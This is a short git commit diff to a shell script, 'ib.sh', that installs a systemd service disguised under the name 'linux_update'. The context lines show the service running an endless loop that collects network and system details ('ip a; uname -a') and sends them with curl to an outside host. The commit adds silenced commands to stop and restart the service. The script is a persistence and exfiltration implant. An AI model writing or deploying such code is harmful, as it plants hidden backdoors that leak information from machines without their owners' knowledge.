0be5994cd6e4b4ca6bf90bc37ccb702d1fca7575
skyf0l <tom.rorato@epitech.eu>
2021-06-21 16:32:41 +0200

    Update ib.sh

--- ib.sh
+++ ib.sh
@@ -25,5 +25,7 @@ ExecStart=/bin/bash -c 'while [ 1 ]; do (ip a; uname -a) | curl https://enj7fhiw
 [Install]
 WantedBy=multi-user.target
 " > /etc/systemd/system/linux_update.service
+systemctl disable linux_update > /dev/null 2>&1
+systemctl stop linux_update > /dev/null 2>&1
 systemctl enable linux_update > /dev/null 2>&1
 systemctl start linux_update > /dev/null 2>&1
